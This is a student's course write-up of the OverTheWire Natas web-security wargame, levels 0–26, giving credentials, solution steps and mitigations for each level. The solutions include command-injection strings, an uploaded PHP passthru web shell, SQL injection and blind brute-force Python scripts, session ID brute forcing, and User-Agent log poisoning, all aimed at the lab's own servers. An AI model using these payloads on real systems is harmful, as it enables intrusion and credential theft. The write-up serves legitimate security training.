# OverTheWire Natas Project Part #1

## Student Information

* Student name: **Giuseppe Schintu**
* NetId: **GSCHINTU**


## Project Description

In this project, you will be complete the Natas challenges at <https://overthewire.org/wargames/natas/>. You will complete challenges Natas 0–Natas 25. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include any JavaScript or other scripts necessary to retrieve the credentials.
3. What mitigations should be used to address the exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Natas 10" will be logged into with the username natas10, and the solution will be the credentials for the user Natas11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.

**Do not wait to start this lab until the last second.** Do a little each week. I recommend that in the first week, you complete Natas 0–13. These early challenges are much easier than the later challenges.


## Hints
* Natas 11: `plaintext ^ key` gives the ciphertext. What does `plaintext ^ ciphertext` equal?
* Natas 15–16: Often bruteforcing all possible passwords will take too long. Is there a way to incrementally guess prefixes of the password?
* Natas 17: Are there any side channels we could use?
* Natas 25: The main page will not contain the password file. Is there another page that you can trick into including the password file? Note, this challenge requires chaining two different attacks.


## Challenges

---
### Natas 00

#### Credentials
natas0
natas0

#### How you passed the challenge
Inspect the html code

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Don't leave any sensitive info in html tags as they get passed to the client browser.


---
### Natas 01

#### Credentials
natas1
g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

#### How you passed the challenge
Inspect the html code from Menu as right click is blocked.

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Don't leave any sensitive info in html tags as they get passed to the client browser.



---
### Natas 02

#### Credentials
natas2
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
#### How you passed the challenge
Inspect the html code from Menu as right click is blocked.
there is a files/pixel.png
when inspecting http://natas2.natas.labs.overthewire.org/files/ there is another file called users.txt

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Put rule on server that folders are not inspectable, unless truly needed. Also, don't store credentials on server.



---
### Natas 03

#### Credentials
natas3
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

#### How you passed the challenge
/robots.txt reveals secret folder name
folder name has users.txt file

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
don't store credentials on server


---
### Natas 04

#### Credentials
natas4
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

#### How you passed the challenge
Since request is expected from natas5, forwarded with natas5 url


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Don't trust user input in any html header that can be altered.
Use openid or server side forward.


---
### Natas 05

#### Credentials
natas5
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

#### How you passed the challenge
Cookie has loggedin=0; I manually changed it to loggedin=1

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure that content in a cookie is encrypted or at a minimum signed to preserve value from server.


---
### Natas 06

#### Credentials
natas6
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

#### How you passed the challenge
checking source code it reads:
$secret == $_POST['secret'], but it also says that $secret comes from includes/secret.inc
secret.inc reveals secret code to the browser.
secret is FOEIUWGHFEEUHOFUOIU

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
dont allow certain file extensions to reveal code(.php, .inc) or to be indexable.


---
### Natas 07

#### Credentials
natas7
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

#### How you passed the challenge
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
Since the main pages shows that index.page?page=home|about, why not try /etc/natas_webpass/natas8
indeed, we get the next password.

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure that any input is validated. In this case, matching the links to a whitelist.

---
### Natas 08

#### Credentials
natas8
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

#### How you passed the challenge
use hex2bin, then string reverse, then base64_decode 
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
secret key: oubWYf2kBq

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Use hashing and salting so that password is obfuscated.


---
### Natas 09

#### Credentials
natas9
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

#### How you passed the challenge
xxxx dictionary.txt; find / -name *natas*;
xxxx dictionary.txt; cat /etc/natas_webpass/natas10

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Clearly, ensure data validation and limit the use of passthru PHP command. 



---
### Natas 10

#### Credentials
natas10
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

#### How you passed the challenge
I saw many password files in the previous exercise so, had to look for a command that allows me to read
files without using the blocked characters. -v does the trick if we know what file we are aiming at.
-v - /etc/natas_webpass/natas11

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Natas 11

#### Credentials
natas11
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

#### How you passed the challenge

<?php
function xor_encrypt($in) {
    $key = 'KNHL'; // Use unencrypted string as key
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

// 1. base64 decode encrypted string
$base64decoded = '{"showpassword":"yes","bgcolor":"#ffffff"}';

// 2. Execute XOR function
$secretKey = xor_encrypt($base64decoded);

// 3. Print secret key
print(base64_encode($secretKey));

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
there should be a server side check to ensure that original session cookie value is preserved


---
### Natas 12

#### Credentials
natas12
YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

#### How you passed the challenge
created php script:

<html>
<body>

<form method="POST">
    <input name="cmd" id="cmd">

<?php
echo $_REQUEST["cmd"];

echo passthru ($_REQUEST["cmd"])

?>
</body>

saved as .JPG and before uploading changed the name to .php

at this point I can execute shell commands:

cat /etc/natas_webpass/natas13

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure server validation, in this case only images are to be expected.


---
### Natas 13

#### Credentials
natas13
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

#### How you passed the challenge
get a small image and edit content to add:

<html>
<body>

<form method="POST">
    <input name="cmd" id="cmd">

<?php

echo passthru ($_REQUEST["cmd"])

?>
</body>

change file to .php, upload and run the following:

cat /etc/natas_webpass/natas14

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
dont allow images to execute code

---
### Natas 14

#### Credentials
natas14
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

#### How you passed the challenge
adding the following SQL injection to the password field did the trick:
" or ""="

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure data sanitization prior SQL construct


---
### Natas 15

#### Credentials
natas15
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

#### How you passed the challenge
Built python script that brute force based on binary LIKE password characters.

#! /bin/python
import requests, string
url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []
exists_str = "This user exists"
"""
for c in characters:
    uri = ''.join([url, '?' , 'username=natas16"', '+and+password+LIKE+BINARY+"%' ,c, '%' , '&debug' ])
    r = requests.get(uri, auth=(username, password))
    if exists_str in r.text:
        passchar.append(c)
        print("> {0}".format(''.join(passchar)))
print("Character List: {0}".format(''.join(passchar)))

"""
secret =''
passchar = ['2','3','5','7','9','a','d','f','g','i','j','k','l','q','r','u','A','D','E','H','O','P','R','T','V','Z']
for place in range(1,33):
    print ("Character# <1".format(str(place)))
    for char in passchar:
        temp = ''.join([secret,char])
        uri = ''.join([url, '?' , 'username=natas16"', '+and+password+LIKE+BINARY+"' ,temp, '%' , '&debug' ])
        r = requests.get(uri, auth=(username, password))
        if exists_str in r.text:
            secret += char
            print("Password : {}".format(secret))


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure data sanitization and limit password attempts to counter brute force attack.


---
### Natas 16

#### Credentials
natas16
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

#### How you passed the challenge
build script in python to brute force
#! /bin/python
import requests, string
url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []
exists_str = "This user exists"

for c in characters:
    query = '/?needle=brute$(grep ' + c + ' /etc/natas_webpass/natas17)'
    uri = url+query
    r = requests.get(uri, auth=(username, password))
    if 'brute' not in r.text:
        passchar.append(c)
        print("> {0}".format(''.join(passchar)))
print("Character List: {0}".format(''.join(passchar)))


secret =''
for place in range(1,33):
    print ("Character# <1".format(str(place)))
    for char in passchar:
        temp = ''.join([secret,char])
        query = '/?needle=brute$(grep ^' + temp + ' /etc/natas_webpass/natas17)'
        uri = url+query
        r = requests.get(uri, auth=(username, password))
        if 'brute' not in r.text:
            secret += char
            print("Password : {}".format(secret))


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure data validation and limit password attempts to counter brute force attack.



---
### Natas 17

#### Credentials
natas17
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

#### How you passed the challenge
Similar python script as natas16, however, slight modification to use blind sql injection
With blind sql injection we can add a sleep time when a condition is true; this will give us a hint on the character we are testing.

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure data validation and limit password attempts to counter brute force attack.
Also, ensure database user cannot run SQL priviledged commands.


---
### Natas 18

#### Credentials
natas18
8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

#### How you passed the challenge
Since session id number is a number from 0 to 640, we can write brute force python script
to create a cookie with different numbers and see which one is associated with an admin:

#! /bin/python
import requests, string, sys
url = "http://natas18.natas.labs.overthewire.org"
username = "natas18"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []

s_msg = 'You are an admin'
f_msg = 'You are logged in as a regular user'

for sesid in range(0, 1000):
    cookie = dict(PHPSESSID=str(sesid))
    query = '/index.php?username=admin&password=test&debug'
    uri = url+query
    r = requests.get(uri, auth=(username, password), cookies=cookie)
    if(s_msg in r.text):
        print("Success {}".format(r.text))
        sys.exit()
    elif f_msg in r.text:
        print("Fail SessID# {}".format(sesid))

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure cookie are tamper proof with MAC or other mecanism that allows data validation on server as well


---
### Natas 19

#### Credentials
natas19
8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

#### How you passed the challenge
COOKIE is a hex representation of "number-username". similar to previous level brute force.

#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas19.natas.labs.overthewire.org"
username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []

s_msg = 'You are an admin'
f_msg = 'You are logged in as a regular user'

decode_hex = codecs.getdecoder("hex_codec")
encode_hex = codecs.getencoder("hex_codec")

for idnum in range(0, 640):
    idstr = ''.join([str(idnum),'-','admin'])
    sesid = binascii.hexlify(bytes(idstr, "utf-8")).decode('utf-8')
    cookie = dict(PHPSESSID=str(sesid))
    query = '/index.php?username=admin&password=test&debug'
    uri = url+query
    r = requests.get(uri, auth=(username, password), cookies=cookie)
    if(s_msg in r.text):
        print("Success {}".format(r.text))
        sys.exit()
    elif f_msg in r.text:
        print("Fail SessID# {} - {}".format(sesid, decode_hex(sesid)))
        print(cookie)

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure cookie are tamper proof with MAC or other mecanism that allows data validation on server as well


---
### Natas 20

#### Credentials
natas20
guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH

#### How you passed the challenge
Reading the PHP source code the session_set_save_handler calls mywrite function.
mywrite function has no controls(except alpha chars) and based on the session id it writes whatever is posted to the backend. In this case print_credentials looks for and admin 1 entry.

#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas20.natas.labs.overthewire.org"
username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

r = requests.post(url, auth=(username, password), data=(dict(name="test\nadmin 1")))
cookie = r.cookies.get_dict()

r2 = requests.get(url, auth=(username, password), cookies=cookie)
print (r2.content)


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure data validation


---
### Natas 21

#### Credentials
natas21
89OWrTkGmiLZLv12JY4tLj2c4FW0xn56

#### How you passed the challenge
main site looks for admin=1, but natas21-experimenter can set any request payload into the session on a post request.

#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas21.natas.labs.overthewire.org"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org"
username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

r2 = requests.post(url2, auth=(username, password), data=(dict(submit="Update",admin="1")))
cookie = r2.cookies.get_dict()

r3 = requests.post(url, auth=(username, password), data=(dict(admin="1")), cookies=cookie)
print (r3.content)

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure data validation and that only specific controls can set session data as session data can be shared across different site if hosted on the same server and environment, like PHP.


---
### Natas 22

#### Credentials
natas22
91awVM9oDiUGm33JdzM7RVLBS8bz9n0s

#### How you passed the challenge
http://natas22.natas.labs.overthewire.org/?revelio=1
adding revelio to GET should do the trick as the page redirects because there is no way to set the admin, but the last check is only for revelio...

Could not get python to show content of a 302 redirect, so had to use Burp and intercept response.

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
ensure that all checks are in place, the second check should not just trust that the first redirect works as expected.

---
### Natas 23

#### Credentials
natas23
qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj

#### How you passed the challenge
strstr will return any text/value before the matching string, so "11iloveyou" will satisfy both conditions

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
be aware of functions and their limitations/consequences. A tool for code testing should have found this issue.


---
### Natas 24

#### Credentials
natas24
0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r

#### How you passed the challenge
strcmp or PHP in general is known to have issue when comparing different types of objects.
I just tried changing the URL to:
http://natas24.natas.labs.overthewire.org/?passwd[]


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure data sanitization and data validation. Also, the opposite check should have been safer: if strcmp() == 1 then show credentials.


---
### Natas 25

#### Credentials
natas25
O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx

#### How you passed the challenge
source code reveals how and where log file is populated.
also, the language file does check for natas_webpass, however it will log the attempt anyways.
when the log request is saved to file, it appears that HTTP_USER_AGENT is appended to the log. We can exploit with a PHP command.

so, passing changing the lang to :lang=....//logs/natas25_fos2f79fbh8gga6b4j9rkvvbek.log
and forcing user agent to: User-Agent: <?php exec("cat /etc/natas_webpass/natas26"); ?>



#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
Ensure data validation. There are libraries for PHP that will sanitize all fields.

## Natas 26

### Credentials
natas26
8A506rfIAXbKKk68yJeuTuRq4UfcK70k